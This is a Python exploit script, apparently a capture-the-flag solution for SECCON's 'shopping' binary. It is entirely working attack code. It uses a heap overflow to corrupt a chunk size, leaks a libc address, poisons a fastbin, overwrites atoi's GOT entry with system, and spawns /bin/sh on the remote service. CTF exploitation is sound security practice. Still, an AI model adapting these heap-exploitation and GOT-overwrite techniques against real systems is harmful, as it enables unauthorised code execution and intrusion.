#!/usr/bin/env python
from sc_pwn import *

str_pname   = './shopping'

env = Environment('local', 'remote')
env.set_item('mode',    local   = 'LOCAL', \
                        remote  = 'SOCKET')
env.set_item('target',  local   = {'program':str_pname}, \
                        remote  = {'host':'shopping.pwn.seccon.jp','port':16294})
env.set_item('libc',    local   = lib_path(str_pname, 'libc.so.6'), \
                        remote  = '../libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')
env.select()

libc = ELF(env.libc)
binf = ELF(str_pname)
addr_got_atoi   = binf.got('atoi')
addr_mshop      = 0x603108  # binf.symbol('m_shop')

#==========
def attack(cmn):
    sp = shopping(cmn)

    sp.add_product('a'*0x40, 0, 0)
    sp.reset_product()

    while True:
        sp.add_product('b'*0x10, 1000000, 0)
        
        m = re.search('x ([\.0-9]+)', sp.list_product()[0])
        if float(m.group(1))>1.5:
            break
        sp.reset_product()

    while sp.change_mode(sp.SHOP):
        proc('m_shop : %d' % sp.m_shop)
        amount = sp.m_shop/1000000
        sp.add_product('b'*0x10, None, amount)

        sp.add_cart('b'*0x10, amount)
        sp.buy()

    # heap overflow -> chunk size(0x21->0xe1) -> free
    cmn.read_until('>> ')
    cmn.sendln('y')
    cmn.read_until('your name  : ')
    cmn.sendln('AAAA')
    cmn.read_until('when crash : ')
    cmn.sendln('B'*0x2a+'\xe1')

    sp.add_product('c'*0x10, 1000000-0x21, 1)   # m_shop -> 0x21
    addr_libc_arena = sp.edit_report(None, None)['name']
    addr_libc_arena = unpack_64(addr_libc_arena+'\x00'*(8-len(addr_libc_arena)))
    libc.base       = addr_libc_arena - 0x3be7b8
    info('addr_libc_base    = 0x%08x' % libc.base)

    sp.add_cart('c'*0x10, 0)    
    sp.reset_cart()

    # fastbins(0x20)->next = addr_mshop-0x8
    sp.edit_report(pack_64(addr_mshop-0x8), None)
    sp.add_cart('c'*0x10, 0)
    
    exploit  = '0'*0x8                      # *l_cart
    exploit += pack_64(addr_got_atoi-0x8)   # *report
    sp.add_product(exploit, 0, 0)
    
    sp.edit_report(None, pack_64(libc.function('system')))  # atoi@got.plt -> system

    cmn.read_until('Exit\n: ')
    cmn.sendln('/bin/sh')

class shopping:
    def __init__(self, cmn):
        self.read_until = cmn.read_until
        self.sendln     = cmn.sendln
        self.mode       = None
        self.SHOP       = 1
        self.CUSTOMER   = 2
        self.REPORT     = -1
        
        self.m_shop     = None

    def change_mode(self, md):
        if self.mode != md:
            if self.mode in [self.SHOP, self.CUSTOMER]:
                self.read_until(': ')
                self.sendln('0')
            
            self.read_until(': ')
            self.sendln(str(md))
            self.mode = md

            if self.mode == self.SHOP:
                if 'WTF' in self.read_until(['####', 'WTF']):
                    return False
                m = re.search('\(\$([0-9]+)\)', self.read_until('####'))
                self.m_shop = int(m.group(1))
        return True
        
    def add_product(self, name, price, stock):
        self.change_mode(self.SHOP)
        self.read_until(': ')
        self.sendln('1')
        self.read_until('Name >> ')
        self.sendln(name)
        if 'Price' in self.read_until('>>'):
            self.sendln(str(price))
            self.read_until('Stock >>')
        self.sendln(str(stock))

    def list_product(self):
        self.change_mode(self.SHOP)
        self.read_until(': ')
        self.sendln('2')
        return self.read_until('LIST DONE\n', contain=False).split('\n')[2:-1]
        
    def reset_product(self):
        self.change_mode(self.SHOP)
        self.read_until(': ')
        self.sendln('3')

    def add_cart(self, name, c):
        self.change_mode(self.CUSTOMER)
        self.read_until(': ')
        self.sendln('1')
        self.read_until('name >> ')
        self.sendln(name)
        self.read_until('Amount >> ')
        self.sendln(str(c))
        
    def buy(self):
        self.change_mode(self.CUSTOMER)
        self.read_until(': ')
        self.sendln('3')

    def reset_cart(self):
        self.change_mode(self.CUSTOMER)
        self.read_until(': ')
        self.sendln('4')

    def edit_report(self, name, result):
        self.change_mode(self.REPORT)

        self.read_until('#$&#$&#$& SHOW BUG REPORT &$#&$#&$#\n')
        o_r = cmn.read_until('\n(', contain=False)
        o_n = cmn.read_until(')\n', contain=False)
        
        self.read_until('>> ')
        if name is not None:
            self.sendln('y')
            self.read_until('your name  : ')
            self.sendln(name)
        else:
            self.sendln('n')
            
        self.read_until('>> ') 
        if result is not None:
            self.sendln('y')
            self.read_until('when crash : ')
            self.sendln(result)
        else:
            self.sendln('n')

        return {'name':o_n, 'reason':o_r}

#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)

    del(cmn)
    
#==========
